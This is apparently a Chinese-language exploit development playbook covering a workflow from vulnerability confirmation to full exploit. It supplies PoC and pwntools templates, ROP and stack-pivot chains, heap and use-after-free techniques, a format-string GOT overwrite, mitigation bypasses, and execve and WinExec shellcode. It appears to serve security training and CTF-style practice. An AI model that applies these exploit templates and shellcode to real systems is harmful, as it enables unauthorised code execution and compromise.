# Vulnerability Development - 漏洞利用开发工作流

## 完整流程图

```
漏洞发现/披露
    │
    ▼
┌─────────────┐
│  漏洞确认     │ ◄── 复现+验证漏洞真实存在
└──────┬───────┘
       │
       ├─→ 环境搭建 (目标版本匹配)
       ├─→ PoC复现 (触发崩溃/异常行为)
       ├─→ 根因分析 (为什么出问题)
       └─→ 可利用性评估 (能控制什么?)
       │
       ▼
┌─────────────┐
│  利用原语开发  │ ◄── 构建基础利用能力
└──────┬───────┘
       │
       ├─→ 信息泄露 (堆栈地址/ASLR绕过)
       ├─→ 写入原语 (任意位置写)
       ├─→ 读取原语 (任意位置读)
       └─→ 控制流劫持 (PC/IP/EIP控制)
       │
       ▼
┌─────────────┐
│  完整Exploit  │ ◄── 组合原语实现目标
└──────┬───────┘
       │
       ├─→ 堆溢出 → heap spray / tcache poisoning / unsafe unlink
       ├─→ 栈溢出 → ROP chain / stack pivot / JOP/COP
       ├─→ UAF → vtable hijack / tcache dup / partial overwrite
       ├─→ 格式化字符串 → 任意读写 / 劫持返回地址
       ├─→ 整数溢出 → 缓冲区大小控制 → 后续溢出
       └─→ 竞态条件 → TOCTOU / double-fetch / race window
       │
       ▼
┌─────────────┐
│  绕过与稳定化  │ ◄── 对抗防护机制
└──────┬───────┘
       │
       ├─→ ASLR绕过 (信息泄露 + 精确偏移)
       ├─→ NX/DEP绕过 (ROP/JOP/COP)
       ├─→ Stack Canary绕过 (泄露/爆破/覆盖)
       ├─→ CFG/CFI绕过 (合法gadget链)
       └─→ 沙箱绕过 (SROP / ret2libc / orw)
       │
       ▼
┌─────────────┐
│  Shellcode   │ ◄── 最终载荷
└──────┬───────┘
       │
       ├─→ execve("/bin/sh") (Linux)
       ├─→ CreateProcessA (Windows)
       ├─→ reverse shell / bind shell
       ├─→ stager (小体积下载完整payload)
       └─→ 绕过字符限制 (alpha encoded / alphanumeric)
       │
       ▼
┌─────────────┐
│  测试与报告   │
└─────────────┘
```

---

## Phase 1: 漏洞确认与根因分析

### 1.1 环境搭建

```bash
# 版本匹配至关重要!
# 目标: 确认精确版本号
target_app --version
strings target_binary | grep -i "version\|build\|release"

# 编译带调试信息的版本(如果有源码)
CFLAGS="-g -fno-stack-protector -z execstack -no-pie" make

# ASAN/UBSAN编译 (辅助调试)
CFLAGS="-fsanitize=address -fsanitize=undefined -g" make
```

### 1.2 PoC开发

```python
# 最小PoC模板
import socket, struct, sys

def poc(target_ip, target_port):
    # 触发漏洞的最小输入
    payload = b"A" * overflow_size

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send(payload)
        response = s.recv(1024)
        print(f"Response: {response}")
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    poc(sys.argv[1], int(sys.argv[2]))
```

### 1.3 崩溃分析

```bash
# 使用ASAN编译的版本运行PoC
./vulnerable_program < poc_input

# GDB调试
gdb ./vulnerable_program
# 运行: run < poc_input
# 查看崩溃: info registers
# 查看栈: x/100x $rsp
# 回溯: bt full

# 崩溃类型判断:
# SIGSEGV at RIP=0x4141414141414141 → 栈溢出(直接覆盖返回地址)
# SIGSEGV at invalid address → UAF/double-free/use-after-return
# heap corruption detected by glibc → 堆溢出
# stack smashing detected → canary被触发
# abort in __asan_report → ASAN检测到内存错误
```

### 1.4 根因定位

```
崩溃点 ≠ 漏洞点
需要从崩溃位置回溯到真正的漏洞代码:

1. 在崩溃处设置断点
2. 回溯调用栈 (bt)
3. 检查每个栈帧的局部变量
4. 找到缓冲区定义位置
5. 分析边界检查缺失的原因
6. 确认可控输入如何到达漏洞点
```

## Phase 2: 利用原语开发

### 2.1 信息泄露 (Info Leak)

**目的**: 绕过ASLR，获取栈/堆/库地址

```python
# 常见泄露方式
# 1. 格式化字符串泄露栈内容
payload = b"AAAA" + b"%p." * 50
# 输出中找到栈地址和libc地址

# 2. 越界读取泄露堆内容
payload = b"A" * offset + p64(leak_addr)

# 3. UAF读取已释放对象中的指针
# 先分配对象A(含指针) → 释放A → 分配对象B(可控) → 读B的内容 = A的残留

# 4. 从泄露地址计算基址
libc_leak = u64(leaked_bytes.ljust(8, b'\x00'))
libc_base = libc_leak - libc_symbol_offset
print(f"libc base: {hex(libc_base)}")
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
```

### 2.2 栈溢出利用

#### 基础覆盖 (无保护)

```python
from struct import pack

buf_size = 64          # 缓冲区大小
ret_offset = buf_size + 8  # 到返回地址的偏移 (含saved rbp)

# 直接覆盖返回地址
payload = b"A" * ret_offset
payload += p64(target_address)  # 跳转到shellcode/system/one_gadget
```

#### ROP (绕过NX)

```python
# ROP gadget搜索
# ropper --file libc.so.6 --search "pop rdi; ret"
# ROPgadget --binary libc.so.6 --re "pop rdi"

# Linux x64 execve("/bin/sh") ROP chain
pop_rdi = 0x000000000002155b  # pop rdi; ret
ret = 0x0000000000022568      # ret (栈对齐)
system_plt = ...               # system@plt 或 libc system
bin_sh = ...                   # "/bin/sh" 字符串地址

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)             # 栈对齐 (System V ABI要求)
payload += p64(system_plt)
```

#### Stack Pivot (空间不足时)

```python
# 当栈上的空间不够放完整的ROP chain时
# 需要pivot到更大的区域(如heap或bss段)

# leave; ret gadget
# mov rsp, rxx; ret gadget
# xchg eax, esp; ret (32-bit)

leave_ret = 0x00000000004006a0  # leave; ret
pivot_target = 0x602000         # bss段(可写且有足够空间)

payload = b"A" * offset
payload += p64(pivot_target)    # fake saved rbp
payload += p64(leave_ret)       # leave → rsp=fake_rbp, ret → 执行pivot目标处的ROP
# 然后在pivot_target处布置完整ROP chain
```

### 2.3 堆溢出利用

#### Unsafe Unlink (旧版glibc)

```python
# 条件: glibc < 2.30, 有可控制的相邻chunk
# 原理: 利用unlink宏修改指针实现任意写

fake_chunk = p64(0)           # prev_size (不重要)
fake_chunk += p64(0)          # size (PREV_INUSE位设置)
fake_chunk += p64(target_addr - 0x18)  # fd → *target_addr-0x18 = &fake_chunk-0x18
fake_chunk += p64(target_addr - 0x10)  # bk → *target_addr-0x10 = &fake_chunk-0x10

# 触发free(fake_chunk) → FD->bk = BK; BK->fd = FD;
# 结果: *(target_addr-0x10+0x18) = target_addr-0x18
# 即: target_addr+0x08 = target_addr-0x18 (部分写入)
```

#### TCache Poisoning (glibc 2.26+)

```python
# tcache没有完整性检查(glibc < 2.32)
# 可以直接修改fd指针实现任意分配

# 步骤1: free一个chunk到tcache
# 步骤2: 通过UAF或其他方式修改fd为目标地址
# 步骤3: 再次malloc → 返回目标地址

# glibc 2.32+: tcache增加了key保护
# 但可以通过部分覆写绕过
```

#### House of系列 (高级技术)

```
House of Spirit:
  - 在目标位置伪造chunk
  - free该伪造chunk
  - malloc返回目标地址

House of Force:
  - 覆写top chunk的size为极大值(-1)
  - 控制malloc分配到任意地址

House of Orange:
  - 无需free的情况下利用unsorted bin attack
  - 触发sysmalloc中的_int_malloc

House of Lore:
  - 利用small bin attack
  - 修改bk指针实现任意写
```

### 2.4 Use After Free (UAF)

```python
# UAF利用流程
# 1. 分配对象A (含虚表指针)
# 2. 释放对象A (fd/bk被覆盖为freelist指针)
# 3. 分配对象B (大小相同, 复用A的内存)
# 4. 通过B的接口操作 → 实际操作的是残留数据

# vtable hijack
class FakeVtable:
    def __init__(self):
        self.vtable = p64(target_addr)  # 虚表指向我们控制的位置
        self.data = b"/bin/sh\x00"

# 分配B时填入伪造的对象
payload = flat({
    0: fake_vtable_ptr,     # vtable pointer → 我们控制的虚表
    8: system_addr,         # 虚表中第一个函数指针 → system()
    16: bin_sh_addr         # 第一个参数 → "/bin/sh"
})
```

### 2.5 格式化字符串

```python
# 任意写 (覆盖GOT表)
def fmt_write(offset, addr, value):
    """
    offset: 泄露的起始偏移 (printf的第几个参数)
    addr: 要写入的目标地址
    value: 要写入的值 (通常为函数地址)
    """
    payload = b""

    # 将addr放在栈上
    payload += p64(addr)
    payload += p64(addr + 2)  # 写入高2字节

    # 计算padding使对齐
    # printf输出已有字节数
    current_len = len(payload)

    # 写低2字节
    low = value & 0xffff
    if low >= current_len:
        payload += f"%{low - current_len}c".encode()
    else:
        payload += f"%{low + 0x10000 - current_len}c".encode()
    payload += f"%{offset}$hn".encode()  # 2字节写
    current_len = low

    # 写高2字节
    high = (value >> 16) & 0xffff
    if high >= current_len:
        payload += f"%{high - current_len}c".encode()
    else:
        payload += f"%{high + 0x10000 - current_len}c".encode()
    payload += f"%{offset + 1}$hn".encode()

    return payload

# 使用: 覆盖printf的GOT为system
payload = fmt_write(6, printf_got, system_addr)
```

## Phase 3: 防护绕过

### 3.1 ASLR绕过

```
方法1: 信息泄露 (最常用)
  - 格式化字符串泄露栈地址
  - UAF泄露堆地址
  - 未初始化变量泄露libc地址
  - puts/printf泄露栈上的地址

方法2: 爆破 (低熵环境)
  - 12-bit (brute force ~4096): 可行
  - 16-bit以上: 不现实
  - fork server子进程ASLR不变!

方法3: 部分覆写
  - 只覆写地址的低1-2字节
  - 减少需要的猜测次数
```

### 3.2 Stack Canary绕过

```
方法1: 泄露canary
  - 格式化字符串读取canary值
  - 栈溢出+puts泄露(canary在rbp之前)
  - 爆破: canary最低字节固定为\x00, 其余逐字节爆破

方法2: 覆盖相关数据跳过canary检查
  - 某些情况下可以不经过canary检查到达目标

方法3: 攻击其他位置
  - 覆盖返回指针之外的函数指针
  - 覆盖结构体中的函数指针
```

### 3.3 NX/DEP绕过 → ROP

```python
# ROP chain构建工具
from pwn import *

elf = ELF('./vulnerable')
libc = ELF('./libc.so.6')

# 搜索gadgets
rop = ROP(elf)
rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(rop.find_gadget(['ret']).address)  # 栈对齐
rop.call('system', [next(elf.search(b'/bin/sh'))])

print(rop.dump())
```

### 3.4 CFI/CFG绕过

```
Windows CFG:
  - Call目标必须在有效函数范围内
  - 使用call-compatible gadgets
  - 修改虚表指向相同签名的有效函数

Intel CET (IBT + Shadow Stack):
  - IBT: 间接跳转必须以endbr64开头
  - Shadow Stack: 返回地址有独立副本
  - 需要: endbr64 gadget + shadow stack leak/overwrite
```

## Phase 4: Shellcode

### 4.1 Linux x64 Shellcode

```nasm
; execve("/bin/sh", NULL, NULL) - 24 bytes
global _start
section .text

_start:
    xor rdx, rdx            ; argv = NULL
    push rdx                ; null terminator for string
    mov rbx, 0x68732f2f6e69622f ; "/bin/sh"
    push rbx
    mov rdi, rsp            ; rdi = "/bin/sh"
    push rdx                ; envp = NULL
    push rdi
    mov rsi, rsp            ; rsi = argv = ["/bin/sh"]
    xor rax, rax            ; syscall number = 59 (execve)
    add al, 59
    syscall
```

### 4.2 Windows Shellcode

```nasm
; WinExec("cmd.exe", SW_SHOW) - x64
; 需要动态解析API (kernel32/base address from PEB)
BITS 64

start:
    ; Get kernel32 base from InMemoryOrderModuleList
    mov rsi, gs:[0x60]      ; PEB
    mov rsi, [rsi + 0x20]   ; InMemoryOrderModuleList
    lodsq                    ; first entry (exe)
    lodsq                    ; second entry (ntdll)
    mov rdx, [rax + 0x20]   ; kernel32 DllBase

    ; Parse PE export table to find WinExec
    ; ... (PEB walking code)

    ; Call WinExec("cmd", 1)
    sub rsp, 0x30
    xor rcx, rcx
    mov rcx, cmd_string
    mov rdx, 1               ; SW_SHOW
    call rax                 ; WinExec(cmd, 1)
```

### 4.3 字符限制绕过

```python
# Alpha3: 生成字母数字shellcode
# msfvenom -p linux/x64/exec CMD=/bin/sh -f alpha -e alpha_mixed

# 自编码器示例
def alphanumeric_encode(shellcode):
    """将shellcode转换为仅包含[a-zA-Z0-9]的形式"""
    # 使用MMX指令集进行解码
    decoder = (
        b"IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
    )
    return decoder + shellcode.encode()
```

## Phase 5: 自动化工具

```bash
# pwntools - Python exploit development framework
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

io = remote('target', 1337)
# io = process('./vulnerable')

# 泄露
io.sendline(b"AAAA" + b"%13$p")
leak = int(io.recvline(), 16)
log.info(f"Leak: {hex(leak)}")

# 计算
base = leak - offset
system = base + system_offset
log.info(f"Base: {hex(base)}")
log.info(f"System: {hex(system)}")

# 利用
payload = flat(
    b'A' * offset,
    pop_rdi,
    next(search(b'/bin/sh')),
    ret,
    system
)
io.sendline(payload)
io.interactive()
```

## 报告模板

```markdown
# Exploit Development Report: [CVE-ID / 漏洞名称]

## 漏洞概述
- 类型: Stack-based Buffer Overflow / Heap UAF / ...
- 严重程度: Critical / High / Medium
- CVSS: ...

## 影响范围
- 受影响版本: x.x.x - y.y.y
- 不受影响版本: > y.y.y

## 技术细节
### 根因
...

### 利用条件
- [ ] ASLR: 启用/禁用
- [ ] NX: 启用/禁用
- [ ] Stack Canary: 启用/禁用
- [ ] PIE: 启用/禁用
- [ ] 用户交互: 需要/不需要

### Exploit
```python
...完整exploit代码...
```

### 演示
截图/视频: ...
```